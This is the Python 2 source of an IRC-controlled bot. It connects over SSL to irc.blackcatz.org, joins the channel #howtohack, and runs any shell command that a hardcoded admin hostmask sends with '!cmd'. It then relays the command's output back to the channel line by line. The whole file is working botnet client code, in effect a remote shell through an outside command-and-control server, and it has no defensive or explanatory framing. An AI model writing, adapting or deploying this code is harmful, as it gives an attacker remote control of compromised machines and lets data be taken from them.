#!/usr/bin/env python2

import subprocess
import platform
import random
import socket
import select
import string
import time
import sys
import ssl

IRC_USER = 'bot_' + ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(4))
IRC_USER_MSG = ''.join(platform.system() + '_' + platform.release())
IRC_BUFFER = 1024
IRC_ADMIN = 'dd_!dd_@hugs.kisses.fuckyou'

IRC_ACTIONS_1 = ['PRIVMSG', 'NOTICE']
IRC_ACTIONS_2 = ['PART', 'NICK', 'JOIN', 'PONG']
IRC_ACTIONS_3 = ['USER']

class bCli(object):
	def __init__(self, host, port):
		self.host = socket.gethostbyname(host)
		self.port = int(port)
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		if port == 6697: self.sock = ssl.wrap_socket(self.sock)
		
	def _connect(self, channel):
		self.channel = str(channel)
		try:
			self.sock.connect((self.host, self.port))
			self.sock.setblocking(False)
		except socket.error as e:
			print "[x] Socket Error: ", e
			sys.exit(-1)
			
		self._send("USER", IRC_USER)
		time.sleep(0.2)
		self._send("NICK", IRC_USER)
		self._loop()
						
	def _send(self, command, message):
		self.command = str(command)
		self.message = str(message)
	
		while True:
			if self.command in IRC_ACTIONS_1:
				self.sock.send("%s %s :%s\r\n" % (self.command, self.channel, self.message))
				break
					
			if self.command in IRC_ACTIONS_2:
				self.sock.send("%s %s\r\n" % (self.command, self.message))
				break
	
			if self.command in IRC_ACTIONS_3:
				self.sock.send("%s %s * * %s\r\n" % (self.command, self.message, IRC_USER))
				break
	
	def _recv(self, buffer):
		for line in buffer.splitlines():
			if line.find("PING")!=-1:
				self._send("PONG", line.split()[1])
				continue

			try:
				_, info, msg = line.split(':', 2)
				server, code, target = info.split()[:3]

				if code == '003':
					self._send("JOIN", self.channel)
					continue
				
				if server == IRC_ADMIN and code == 'PRIVMSG' and target == IRC_USER:
					if msg.find("!cmd ")!=-1:
						msg = msg.split()[1:]
						msg = ' '.join(str(x) for x in msg)
						self._send("PRIVMSG", "[+] Running command: `%s`" % (msg))
						self._exec(msg)
						continue

			except ValueError:
				pass
											
			print line
		
	def _loop(self):
		while True:
			read, write, error = select.select([self.sock], [], [], 0.1)
                
			for i in read:
				if i == self.sock:
					buffer = i.recv(IRC_BUFFER)
					self._recv(buffer)
			
	def _exec(self, msg):
		self.cmd = msg
		line_num = 0
		try:
			p = subprocess.Popen(self.cmd, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
			for line in p.stdout:
				line_num += 1
				self._send("PRIVMSG", "    [Line %d] %s" % (line_num, line))
			p.wait()
		except subprocess.CalledProcessError:	
			print "Error calling command: %s" % (self.cmd)
			pass
#
# ------------
#
a=bCli("irc.blackcatz.org", 6697)
a._connect("#howtohack")
